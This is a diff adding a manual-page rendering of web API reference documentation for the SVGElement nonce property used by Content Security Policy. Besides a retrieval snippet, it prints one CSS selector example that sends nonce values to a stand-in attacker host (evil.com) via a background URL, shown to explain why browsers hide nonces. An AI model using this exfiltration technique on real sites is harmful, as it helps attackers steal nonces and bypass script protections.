@@ -1,0 +1,46 @@
+WEBAPI.SVGELEMENT-NONCE(1)       Sandbox manual       WEBAPI.SVGELEMENT-NONCE(1)
+
+       NAME
+
+       SVGElement: nonce property - The nonce property of the SVGElement interface returns the nonce that is used by Content Security Policy to determine whether a given fetch 
+
+       SVGELEMENT: NONCE PROPERTY
+
+       The nonce property of the SVGElement interface returns the nonce that is used by Content Security Policy to determine whether a given fetch will be allowed to proceed.
+
+       VALUE
+
+       A String; the cryptographic nonce, or an empty string if no nonce is set.
+
+       EXAMPLES
+
+       RETRIEVING A NONCE VALUE
+
+       In the past, not all browsers supported the nonce IDL attribute, so a workaround is to try to use getAttribute as a fallback:
+
+         const svg = document.querySelector("svg");
+         const nonce = svg.nonce || svg.getAttribute("nonce");
+
+         // Modern browsers hide the nonce attribute from getAttribute()
+         console.log(nonce); // Prefer using `svg.nonce`
+
+       However, recent browsers version hide nonce values that are accessed this way (an empty string will be returned). The IDL property (svg['nonce']) will be the only way to access nonces.
+
+       Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data from content attributes like this CSS selector:
+
+         svg[nonce~="whatever"] {
+           background: url("https://evil.com/nonce?whatever");
+         }
+
+       SPECIFICATIONS
+
+       BROWSER COMPATIBILITY
+
+       SEE ALSO
+
+        * HTMLElement.nonce a similar method for HTML elements.
+        * nonce global attribute
+        * Content Security Policy
+        * CSP: script-src
+
+Web APIs manual                         from the official documentation
